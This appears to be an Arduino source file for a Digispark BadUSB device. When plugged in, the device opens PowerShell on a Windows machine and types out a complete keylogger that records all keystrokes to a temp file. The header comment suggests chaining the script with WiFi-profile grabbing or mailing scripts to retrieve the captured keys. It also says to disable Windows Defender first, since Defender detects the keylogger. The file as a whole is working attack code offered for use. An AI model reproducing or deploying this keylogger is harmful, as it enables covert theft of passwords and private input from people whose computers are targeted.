/* 
 *  This DigiKeyboard Script runs dasgoll's Powershell keylogger (https://gist.github.com/dasgoll/7ca1c059dd3b3fbc7277)
 * for a predefined number of seconds ($timeoutSeconds) and saves the results to mykeypress.txt in 
 * APPDATA\Local\Temp\mykeypresses.txt. Feel free to chain this script with the logic in WiFi_Profile_Grabber or 
 * WiFi_Profile_Mailer to retrieve the results.
 * 
 * WARNING: Windows Defender is able to detect this so you will have to chain this after a script disabling Windows Defender.
  */

#include "DigiKeyboard.h"
void setup() {
  //empty
}
void loop() {
  // Open Powershell
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);

  // Write Keylogger Function
  DigiKeyboard.print(F("$code = {function My-Keypresses($Path=\"$env:temp\\mykeypress.txt\") \n{\n  $signatures = @\'\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)] \npublic static extern short GetAsyncKeyState(int virtualKeyCode); \n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int GetKeyboardState(byte[] keystate);\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int MapVirtualKey(uint uCode, int uMapType);\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);\n\'@\n\n  $API = Add-Type -MemberDefinition $signatures -Name \'Win32\' -Namespace API -PassThru\n    \n  $null = New-Item -Path $Path -ItemType File -Force\n\n  try\n  {\n\n    while ($true) {\n      Start-Sleep -Milliseconds 40\n      \n      for ($ascii = 9; $ascii -le 254; $ascii++) {\n        $state = $API::GetAsyncKeyState($ascii)\n\n        if ($state -eq -32767) {\n          $null = [console]::CapsLock\n\n          $virtualKey = $API::MapVirtualKey($ascii, 3)\n\n          $kbstate = New-Object Byte[] 256\n          $checkkbstate = $API::GetKeyboardState($kbstate)\n\n          $mychar = New-Object -TypeName System.Text.StringBuilder\n\n          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)\n\n          if ($success) \n          {\n            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) \n          }\n        }\n      }\n    }\n  }\n  finally\n  {\n  }\n}}; $timeoutSeconds = 10; $j = Start-Job -ScriptBlock $code; if (Wait-Job $j -Timeout $timeoutSeconds) { Receive-Job $j }; Remove-Job -force $j"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
